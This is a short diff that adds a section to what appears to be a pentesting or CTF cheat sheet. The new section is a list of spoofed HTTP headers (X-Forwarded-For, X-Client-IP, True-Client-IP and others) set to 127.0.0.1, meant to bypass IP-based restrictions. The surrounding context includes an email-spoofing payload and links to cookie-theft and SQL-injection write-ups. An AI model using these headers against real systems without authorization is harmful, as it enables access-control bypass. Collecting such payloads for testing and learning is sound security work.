@@ -553,6 +553,24 @@ Attacker
 ```
 ": <attacker@gmail.com> "<spoofed@gmail.com>"
 ```
+# http headers to bypass
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+Via: 1.0 fred, 1.1 127.0.0.1
+```
 # links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
 - [ohmyweb](./src/omyweb.md)
